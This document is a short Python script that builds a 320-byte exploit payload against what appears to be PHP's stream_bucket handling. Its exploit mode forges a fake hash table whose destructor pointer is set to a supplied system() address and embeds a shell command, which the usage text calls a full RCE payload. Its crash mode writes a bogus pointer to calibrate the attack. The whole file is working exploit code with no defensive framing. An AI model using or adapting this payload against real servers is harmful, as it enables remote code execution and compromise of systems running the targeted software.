#!/usr/bin/env python3
"""Build the 320-byte stream_bucket payload (layout per NOTES.md §3.3).

Usage:
  mkpayload.py exploit <S_hex> <system_hex> [tag]   -> full RCE payload
  mkpayload.py crash  [tag]                          -> calibration payload: magic + poison string ptr
"""
import struct, sys

def build_exploit(S, system, tag=b""):
    p = bytearray(320)
    struct.pack_into("<Q", p, 0x60, S + 0x80)          # bucket1 zval.value -> fake HT
    struct.pack_into("<Q", p, 0x68, 0x307)             # IS_ARRAY_EX
    struct.pack_into("<QQ", p, 0x80, 0x0000000700000001, 0xfffffff800000010)  # gc + flags/mask
    struct.pack_into("<Q", p, 0x90, S + 0xa0)          # fake HT arData
    struct.pack_into("<QQ", p, 0x98, 0x0000000100000001, 0)  # nNumUsed/nNumOfElements + ...
    p[0xa0:0xa8] = b"id>/tmp/"                          # command bytes 0..7
    struct.pack_into("<Q", p, 0xa8, 0x78)               # 'x' + NUL padding
    struct.pack_into("<Q", p, 0xb0, system)             # pDestructor = system
    magic = b"PWNMAG1" + tag.ljust(8, b"\x00")
    p[0xc0:0xd0] = magic
    return bytes(p)

def build_crash(tag=b""):
    p = bytearray(320)
    struct.pack_into("<Q", p, 0x60, 0x4141414141414141)  # bogus string ptr
    struct.pack_into("<Q", p, 0x68, 0x106)               # IS_STRING (refcounted) -> release(ptr) -> SEGV
    magic = b"PWNMAG1" + tag.ljust(8, b"\x00")
    p[0xc0:0xd0] = magic
    return bytes(p)

if __name__ == "__main__":
    mode = sys.argv[1]
    if mode == "exploit":
        S = int(sys.argv[2], 16); system = int(sys.argv[3], 16)
        tag = sys.argv[4].encode() if len(sys.argv) > 4 else b""
        out = build_exploit(S, system, tag)
    else:
        tag = sys.argv[2].encode() if len(sys.argv) > 2 else b""
        out = build_crash(tag)
    sys.stdout.buffer.write(out)
